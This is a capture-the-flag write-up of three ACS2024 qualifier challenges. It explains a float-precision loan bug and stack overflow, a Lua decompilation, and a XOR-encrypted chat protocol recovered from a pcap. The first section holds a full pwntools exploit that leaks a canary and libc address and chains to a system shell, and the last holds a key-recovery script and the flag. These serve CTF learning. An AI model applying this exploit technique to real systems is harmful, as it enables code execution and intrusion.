# ACS2024 Quals Writeup by Teh Tarik Cendol

## Table of Contents
- [Audit/no-name minor](#Auditno-name-minor)
- [Rev/CS1338: Script Programming](#RevCS1338-Script-Programming)
- [Rev/Secure Chat](#RevSecure-Chat)

# Audit/no-name minor

This was a challenge similar to the one I created for Battle of Hackers 2024 so we solved it relatively fast. The challenge provides us with a binary that presents a menu that allows the user to borrow a loan, repay the loan, mining for money, buy a name and change name. 

![image](https://github.com/user-attachments/assets/90df0d94-6313-47c3-98f0-9376ca855de0)

The goal is to get a name. But 

- To buy a name, you need to have money.
- To have money you cannot simply mine, cause it will take a lot of time.
- So you need to loan and then repay them.

The vulnerability lies in the way the program keeps track of the user's loan.

<details>
<summary>Source Code</summary>

```c
// Miner struct
struct MinerAccount {
	float cash;
	float debt_balance;
	int mining_attempts;
	char name[0x20];
};

// Loan function
void loan(struct MinerAccount *account) {
	uint32_t amount = 0;
    
	printf("How much loan would you like to request?\n");
	if(scanf("%d", &amount) != 1) {
    	printf("Invalid input\n");
    	return;
	}
    
	if(account->debt_balance + amount > MAX_LOAN) {
    	printf("Loan limit exceeded\n");
    	return;
	}

	account->cash += amount;
	account->debt_balance += amount;

	printf("Current cash: $%.2f\n", account->cash);
	printf("Debt balance: $%.2f\n", account->debt_balance);
}
```
</details>

The user's loan is defined as a float, which can be subjected to **floating point inaccuracy.**  A float is 32 bit and it has 1 bit for sign, 23 bit for mantissa and 8 bit for exponent. For integers, the inaccuracy starts at 2^24 (16,777,216). In other words, all integers can be represented as floats up to 2^24 but not beyond that. Specifically, in the range of 2^24 to 2^25, float does not support odd numbers, only even numbers.

<details>
<summary>Proof of Concept</summary>

### Proof of Concept

![image](https://github.com/user-attachments/assets/e75708b0-e383-4faa-bb98-5bbff0919289)

Heres a simple C program that demonstrates this

![image](https://github.com/user-attachments/assets/592a968a-5ee3-4b0d-a6b0-281de6eae7fa)

This is the output

</details>

### Exploiting the Program

Now, we just need to borrow money until 16777216, buy the name, and borrow loan of size $1 until we eventually are able to repay our loan.

![image](https://github.com/user-attachments/assets/ad4d18bc-c5af-45d3-b630-8f4067bb0321)

Buying the name

![image](https://github.com/user-attachments/assets/318be9bc-d5d2-419d-a6cb-637534776cb4)

After borrowing $1

### Buffer Overflow

<details>
<summary>Source Code</summary>

```c
#define MAX_BUF 0x200
struct MinerAccount {
	float cash;
	float debt_balance;
	int mining_attempts;
	char name[0x20];
};

void change_name(struct MinerAccount *account) {
	if (has_name_rights != 1) {
    	printf("You do not have the right to change your name.\n");
    	printf("Please purchase a name to gain the rights to rename your no-name.\n");
    	return;
	}
	if(account->debt_balance != 0) {
    	printf("You still have debts to repay.\n");
    	printf("Pay off your debts to rename your no-name.\n");
    	return;
	}
	printf("Enter new name.\n");
	read(0, account->name, MAX_BUF);

	printf("Name updated successfully.\n");
}

int main() {
	initialize();
	srand(time(NULL));
	struct MinerAccount account = {0, 0, 0, "no-name"};
	while(1) {
    	int choice;
    	printf("===========================\n");
    	printf("Welcome to %s\n", account.name);
    	printf("Current cash: $%.2f\n", account.cash);
    	printf("Debt balance: $%.2f\n", account.debt_balance);
    	printf("===========================\n");

    	printf("1. Loan\n2. Repayment\n3. Mining\n4. Buy Name\n5. Change Name\n6. Exit\nChoose an action.\n");
    	scanf("%d", &choice);
    	switch(choice) {
        	case 1:
            	loan(&account);
            	break;
        	case 2:
            	repayment(&account);
            	break;
        	case 3:
            	mining(&account);
            	break;
        	case 4:
            	buy_name(&account);
            	break;
        	case 5:
            	change_name(&account);
            	break;
        	case 6:
            	return 0;
        	default:
            	printf("Invalid choice\n");
            	break;
    	}
	}
	return 0;
}
```
</details>

The name in MinerAccount object was assigned to only 0x20 size, but in change_name function we can change up until 0x200. With the help of the printf() in main, we are able to leak the stack canary and libc address after overwriting enough bytes using read(). Putting it all together, we get 

1) We loan 16777216 money
2) Then we buy name so our money no 16777216 - 1337
3) Then if we loan 1 dollar each time, our cash increase, but debt stays the same. So we loan 1 dollar for 1337 times
4) Then can repay all debt
5) Now start the leaking process through name
6) Leak canary
7) Leak libc_start_main address
8) Proceed will rop chain to system

<details>
<summary>Exploit Script</summary>

```py
from pwn import *

exe = './prob'
elf = context.binary = ELF(exe, checksec = False)
io = elf.process()

context.log_level = 'info'

#---------------------------------------------------------------------
sleep(1)
#io.recvuntil(b'Choose an action.\n')
io.sendline(b'1')
#io.recvuntil(b'How much loan would you like to request?\n')
io.sendline(b'16777216')

#io.recvuntil(b'Choose an action.\n')
io.sendline(b'4')


for i in range(1337):
#	io.recvuntil(b'Choose an action.\n')
	io.sendline(b'1')
#	io.recvuntil(b'How much loan would you like to request?\n')
	io.sendline(b'1')

io.recvuntil(b'Choose an action.\n')
io.sendline(b'2')
io.recvuntil(b'How much would you like to repay?\n')
io.sendline(b'16777216')

io.recvuntil(b'Choose an action.')
io.sendline(b'5')
io.recvuntil(b'Enter new name.')
io.sendline(b'A'*44)

io.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n')
canary = io.recv(7).strip()
canary = b'\x00'+canary
canary = unpack(canary)
info(f'Canary: {hex(canary)}')

io.recvuntil(b'Choose an action.')
io.sendline(b'5')
io.recvuntil(b'Enter new name.')
io.sendline(b'A'*59)
io.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n')
libc_add = unpack(io.recv(6).strip().ljust(8,b'\x00'))
info(f'libc leaked : {hex(libc_add)}')

io.recvuntil(b'Choose an action.')
io.sendline(b'5')
io.recvuntil(b'Enter new name.')

libc = ELF('./libc.so.6')
libc.address = libc_add-0x29d90
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

payload = b'A'*44
payload += p64(canary)
payload += b'A'*8
payload += p64(libc.address + 0x0000000000029cd6)
payload += rop.chain()
io.sendline(payload)

#--------------------------------------------------------------------
io.interactive()
```
</details>

# Rev/CS1338: Script Programming

![image](https://github.com/user-attachments/assets/0d5f6ee7-5b36-48fa-8de2-a42a96f3dcb6)

![image](https://github.com/user-attachments/assets/88e3fbcd-01f1-4b0f-8fc2-0a4b20403711)

Given the lua file, we know that it shows the source code of the instance and we are required to connect to the instance and send the correct string in order to get the flag. From the source code, we can see that it loads a file named library.

![image](https://github.com/user-attachments/assets/19b83fbe-001b-4c42-ad58-e83641a02a46)

We tried online decompiler for lua but failed, so ended up using an open source compiler that we learned from https://www.youtube.com/watch?v=nQR1raNkd2s.

![image](https://github.com/user-attachments/assets/e6f88783-f3d0-4860-8d6a-152e4930b4f7)

![image](https://github.com/user-attachments/assets/7aed4f77-0b0e-4b02-9a80-a7991e928c8c)

# Rev/Secure Chat

We are given server.exe, client.exe and OfficeChat.pcapng. The server.exe act as the server for communication, and the client will be acting as the client who start the conversation. This can be seen in the pcap file

![image](https://github.com/user-attachments/assets/9e17b0a9-00f8-4fc1-b7b1-97c044d40e8d)

The high port number is the client. We can verify this by trying to capture loopback address on our system.

![image](https://github.com/user-attachments/assets/bc0fd7d7-5463-4bbe-8f41-9710dde4b504)

### Reversing server.exe

![image](https://github.com/user-attachments/assets/34d47ef0-1de4-4f42-b760-ef107e8ac53e)

The communication process of the server
1. Open socket
2. Accept session
3. Generate key
4. Share key with client
5. Start secure conversation

### Reversing client.exe

![image](https://github.com/user-attachments/assets/2be570e7-1084-4715-bb75-2043389bf274)

The communication process of the client
1. Open socket
2. Start a session with server
3. Receive key from server
4. Start secure communication

Things that we can take note
1. KEY is generated by the server
2. KEY will be shared to the client on network

### Understanding how the KEY being shared on network

![image](https://github.com/user-attachments/assets/c3125e37-e7e0-4a73-aa6e-dca866197ef3)

Before the key is sent on the network, it is encrypted using XOR with kek variable. 

![image](https://github.com/user-attachments/assets/f636ff5b-06f8-44b0-92e8-b265ce2264b2)

This mean, from the given pcap file, we can decrypt the KEY being used by XORing the encrypted key with kek

Decrypted Key

```
0x9e, 0x96, 0xba, 0x9e, 0xf7, 0x36, 0xc8, 0xd8, 0xf7, 0x08, 0x3a, 0xa2, 0xae, 0xc3, 0xfd, 0x35
```

![image](https://github.com/user-attachments/assets/d08257a4-b52d-4d1e-b8e8-18ad23be77cf)

The secure conversation is being encrypted using the same XOR method. Now we got the key, we just extract the data, then decrypt using our key.

<details>
<summary>Extracted Data</summary>

```
e6000000
d3f9c8f09e58aff4d7455bd0c5e2dd6cfbf7d2b2d77fe8af92664e82daab8f5aebf1d2be9a59bbacd7675c82daab9858b0b6eef69244ad79587b1acdc0a6dd56ffe5dfbe835ea9acd7665fc7cab0dd53ebe4cef69244e8bb9b6948cbc8aa9e54eaffd5f0db16aaad83284ecacbe38f50ede29af29859a3f8906755c680e3b49431fad6be8744a7ba966a56db8ea5945bfffad3e49216bcb092651ac0d7e3895df7e59aff9142adaa996755cc80e3aa5dffe29aff9559bdacd77155d791e3b55ae93715edd742a0bdd76b56cbcbad8915eef9c8ea9159a4b198285bd7caaa8915f9f9d3f09009
b4000000
c7f3dbf6db1681f884694d82daab9815fbfbdbf79b18e891832849c7cbae8e15f2ffd1fbd741ad7958645682c0a69851bef79afd9843b8b4922855c48eae9850eaffd4f98416bcb7d76f5582c1b59847bee2d2fbd752adac966156d18eb49441f6b6cef69216abb79a7856cbcfad9e50bee2dfff9a18e88f92285ecdc0625241bee1dbf08316bcb7d76553d1dde39c5be7e2d2f79951e8b19a7855d0daa29341bee1d3ea9f16bcb0927b5f82cdab9c5bf9f3c9b0
02010000
d1fe96be835eadf881694fcedafcdd6cfbf7d2b2d77fe8b0966c1ad6c1e38f50edf3cebe9e42e8b4967b4e82d9a6985ebef7dcea9244e8ac9f6d1ad1d7b08950f3b6cfee9357bcbdd92876c7dae39050bee2d2f7995de6f6d92878c7c8ac8f50bedf9af99242e8ac9f694e82c8ac8f15e7f9cfb2d752a1bcd77155d78ea5945bf7e5d2be8553beb1927f53ccc9e3895dfbb6d6f19658e8aa927855d0dae39b47f1fb9aea9f53e8aa92695682cbb08954eaf39afa9246a9aa83655fccdafcdd61f6f3c33f5844adf8806953d6c7ad9a15f1f89af18244e8be926d5ec0cfa09615eaf99aee8559abbd926c1ad5c7b79515ffb6d8f79016bcaa966649c3cdb7945af0b8
c7000000
d9e4dfff831ae8ac9f6954c9ddeddd74f2e4d3f99f42e4f883605f82c0a68a15eef7c9ed8059babcd76e55d08eb79550bee0dbeb9b42e8b1842818e3ed908671aec9f4f1a369bd8bc4576292dc9c9b05ccc9dfd0946491a8c03955ccf1f7b172aee48bca9f7bb5fad92870d7ddb7dd58fffddfbe8443babdd77155d78eb68d51ffe2dfbe8e59bdaad77a5fc1c1b19946bef7d4fad752a7b656a74e82ddab9c47fbb6d3ead741a1ac9f285bccd7ac9350bef3d6ed9216a7ad837b53c6cbe3895dfbb6cefb965be6
1a000000
cef3c8f89255bcf6d75c5bcec5e3895abeefd5ebd745a7b79929
```
</details>

<details>
<summary>Solve Script</summary>

```py
kek = [0x12, 0x9F, 0xE8, 0x31, 0x52, 0xB2, 0x9A, 0x1D, 0xA9, 0xB0, 0x0D, 0x42, 0xD6, 0x3C, 0x77, 0x1E] #16
key =[0x9e, 0x96, 0xba, 0x9e, 0xf7, 0x36, 0xc8, 0xd8, 0xf7, 0x08, 0x3a, 0xa2, 0xae, 0xc3, 0xfd, 0x35]

flag = []
secret = [0xd9,0xe4,0xdf,0xff,0x83,0x1a,0xe8,0xac,0x9f,0x69,0x54,0xc9,0xdd,0xed,0xdd,0x74,0xf2,0xe4,0xd3,0xf9,0x9f,0x42,0xe4,0xf8,0x83,0x60,0x5f,0x82,0xc0,0xa6,0x8a,0x15,0xee,0xf7,0xc9,0xed,0x80,0x59,0xba,0xbc,0xd7,0x6e,0x55,0xd0,0x8e,0xb7,0x95,0x50,0xbe,0xe0,0xdb,0xeb,0x9b,0x42,0xe8,0xb1,0x84,0x28,0x18,0xe3,0xed,0x90,0x86,0x71,0xae,0xc9,0xf4,0xf1,0xa3,0x69,0xbd,0x8b,0xc4,0x57,0x62,0x92,0xdc,0x9c,0x9b,0x05,0xcc,0xc9,0xdf,0xd0,0x94,0x64,0x91,0xa8,0xc0,0x39,0x55,0xcc,0xf1,0xf7,0xb1,0x72,0xae,0xe4,0x8b,0xca,0x9f,0x7b,0xb5,0xfa,0xd9,0x28,0x70,0xd7,0xdd,0xb7,0xdd,0x58,0xff,0xfd,0xdf,0xbe,0x84,0x43,0xba,0xbd,0xd7,0x71,0x55,0xd7,0x8e,0xb6,0x8d,0x51,0xff,0xe2,0xdf,0xbe,0x8e,0x59,0xbd,0xaa,0xd7,0x7a,0x5f,0xc1,0xc1,0xb1,0x99,0x46,0xbe,0xf7,0xd4,0xfa,0xd7,0x52,0xa7,0xb6,0x56,0xa7,0x4e,0x82,0xdd,0xab,0x9c,0x47,0xfb,0xb6,0xd3,0xea,0xd7,0x41,0xa1,0xac,0x9f,0x28,0x5b,0xcc,0xd7,0xac,0x93,0x50,0xbe,0xf3,0xd6,0xed,0x92,0x16,0xa7,0xad,0x83,0x7b,0x53,0xc6,0xcb,0xe3,0x89,0x5d,0xfb,0xb6,0xce,0xfb,0x96,0x5b,0xe6]

for i in range(len(secret)):
    enc = secret[i]
    enc2 = key[i % 16]
    tmp = enc ^ enc2
    flag.append(chr(tmp))

print("".join(flag))
```
</details>

> Flag : ACS{D0_NoT_uS3_X0r_f0R_eNcRYp71on_4LG0r1ThM}

